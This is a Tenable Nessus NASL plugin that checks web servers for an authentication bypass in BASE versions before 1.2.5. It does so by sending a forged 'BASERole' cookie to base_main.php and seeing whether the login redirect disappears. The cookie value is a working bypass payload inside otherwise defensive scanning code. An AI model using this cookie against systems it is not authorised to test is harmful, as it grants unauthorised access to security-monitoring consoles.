#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
  script_id(39536);
  script_version("$Revision: 1.4 $");

  script_bugtraq_id(35470);
  script_xref(name:"milw0rm",value:"9009");

  script_name(english:"BASE < 1.2.5 readRoleCookie() Auth Bypass");
  script_summary(english:"Attempts to bypass authentication");

  script_set_attribute(attribute:"synopsis", value:
"The remote web application's authentication can be bypassed." );
  script_set_attribute(attribute:"description", value:
"The installed version of Basic Analysis and Security Engine (BASE) on
the remote host is affected by an authentication bypass vulnerability. 
By sending a specially crafted cookie, it may be possible to bypass
authentication and gain access to the application. ");
  script_set_attribute(
    attribute:"see_also", 
    value:"http://archives.neohapsis.com/archives/bugtraq/2009-06/0220.html" );
  script_set_attribute(
    attribute:"solution", 
    value:"Upgrade to BASE version 1.2.5 as that reportedly addresses the issue." );
  script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P" );
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");

port = get_http_port(default:80, embedded: 0);

# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/base", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  url = string(dir, "/base_main.php");
  
  res = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(res)) exit(0);

  # First check if we are looking at BASE, and verify that authentication is required.
  # nb : If we are redirected to index.php, it means authentication is required.
 
  if ( "Basic Analysis and Security Engine" >< res[2] && 
       egrep(pattern:"Location: .*/index.php",string:res[1]) &&
       "302" >< res[0]
     )
  {
    set_http_cookie(
      name :"BASERole", 
      value:"10000|nessus|cd425605d34df7780b4fb5b3b2a64781");
 
    res = http_send_recv3(
           method:"GET", 
           item:url, 
           port:port,
           add_headers: make_array("Content-Type", "application/x-www-form-urlencoded"
         ));

    req = http_last_sent_request();

    if (isnull(res)) exit(0);

    # If we do not see Location set in the response, it means
    # the install is vulnerable.
  
    if("Basic Analysis and Security Engine"   >< res[2] &&
       !egrep(pattern:"Location: .*/index.php",string:res[1]) &&
       ">Alert Group Maintenance<" >< res[2])
    {
     if(report_verbosity > 0)
      {
       report = string("\n",
                  "Nessus was able to access 'base_main.php' without authentication,",
                  "using the following request : ","\n\n",
                  str_replace(find:'\n', replace:'\n  ',string:req));
       security_hole(port:port,extra:report);
      }
      else
        security_hole(port);
    }
  }
}
